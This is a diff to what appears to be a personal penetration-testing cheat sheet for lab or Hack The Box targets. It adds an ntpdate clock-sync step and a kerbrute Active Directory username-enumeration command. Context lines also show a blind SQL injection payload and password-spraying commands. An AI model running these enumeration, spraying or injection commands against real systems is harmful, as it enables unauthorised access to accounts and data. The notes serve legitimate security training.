@@ -13,6 +13,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [ntpdate](#ntpdate)
   - [MYSQL](#mysql)
   - [MSSQL](#mssql)
   - [Nslookup](#nslookup)
@@ -453,6 +454,12 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 
 ## Tools
+### ntpdate
+```bash
+sudo ntpdate 10.10.x.x
+```
+
+
 ### MYSQL
 ```bash
 # mysql configuration file
@@ -761,6 +768,7 @@ rdesktop 192.168.216.165
 
 ### kerbrute
 ```bash
+./kerbrute userenum --dc 10.10.x.x -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 ./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
 ./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
 ```
